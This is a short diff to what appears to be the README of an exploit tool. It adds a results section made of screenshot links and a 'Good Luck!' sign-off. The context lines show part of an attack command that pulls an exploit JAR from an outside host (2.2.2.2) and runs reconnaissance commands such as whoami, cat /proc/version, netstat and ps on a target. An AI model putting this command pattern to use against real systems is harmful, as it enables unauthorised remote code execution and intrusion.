@@ -19,3 +19,13 @@
 http://2.2.2.2/Exploit.jar \
 "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
 ```
+
+### Result
+![](media/15133242895615.png)
+
+![](media/15133243117653.png)
+
+![](media/15133243161989.jpg)
+
+Good Luck!
+![](media/15133243206133.jpg)
